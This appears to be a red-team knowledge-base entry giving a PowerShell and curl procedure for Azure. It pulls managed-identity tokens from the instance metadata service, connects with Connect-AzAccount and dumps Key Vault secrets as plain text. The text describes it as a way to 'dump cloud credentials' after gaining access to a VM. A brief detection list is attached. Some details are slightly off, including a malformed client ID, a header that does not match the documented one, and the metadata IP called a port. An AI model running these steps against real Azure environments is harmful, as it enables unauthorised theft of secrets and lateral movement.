---
id: 140a511f-017a-4b0b-b28f-02aa528cdbb9
name: PowerShell-Azure-Key-Vault-Access-Script
type: code
language: powershell
verified: true
created_at: '2023-05-24T18:03:17.782372+00:00'
updated_at: '2023-05-24T18:03:18.085216+00:00'
platforms:
  - Cloud
tags:
  - azure
  - key-vault
  - managed-identity
  - script
validated: true
---

# PowerShell-Azure-Key-Vault-Access-Script

## Code

```powershell
# keyvault access token
curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&apiversion=2017-09-01" -H secret:$IDENTITY_HEADER
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&apiversion=2017-09-01" -H secret:$IDENTITY_HEADER

# connect
PS> $token = 'eyJ0..'
PS> $keyvaulttoken = 'eyJ0..'
PS Az> Connect-AzAccount -AccessToken $token -AccountId 2e91a4fea0f2-46ee-8214-fa2ff6aa9abc -KeyVaultAccessToken $keyvaulttoken

# query the vault and the secrets
PS Az> Get-AzKeyVault
PS Az> Get-AzKeyVaultSecret -VaultName ResearchKeyVault
PS Az> Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader -AsPlainText
```

## Description

This script combines token retrieval via curl, PowerShell authentication to Azure, and Key Vault querying into a single workflow. It exploits Managed Identity to access secrets without hardcoded credentials, useful for post-compromise enumeration in Azure environments.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $IDENTITY_ENDPOINT | IMDS token endpoint | http://169.254.169.254/metadata/identity/oauth2/token |
| $IDENTITY_HEADER | IMDS request header | Metadata: true |
| $token | Management API bearer token | eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1u... |
| $keyvaulttoken | Key Vault bearer token | eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik... |
| AccountId | Managed Identity client ID | 2e91a4fea0f2-46ee-8214-fa2ff6aa9abc |
| VaultName | Target Key Vault name | ResearchKeyVault |
| Name | Specific secret name | Reader |

## Usage

Execute in an Azure VM with Managed Identity: Set env vars, run curls to get tokens, assign to variables, connect, then query. Ideal for red team ops after initial VM access to dump cloud credentials. Save as .ps1 and invoke with powershell.exe -File script.ps1.

## Detection

- Azure AD sign-in logs for unusual Managed Identity token requests from IMDS.
- PowerShell Script Block Logging capturing Connect-AzAccount and Get-AzKeyVault cmdlets.
- Key Vault access logs showing anomalous secret reads from service principals.
- Network monitoring for IMDS traffic (port 169.254.169.254) combined with curl/PowerShell processes.

## Related

- [[procedures/Access-Azure-Key-Vault-Using-Managed-Identity]]
- [[tools/Az-PowerShell]]
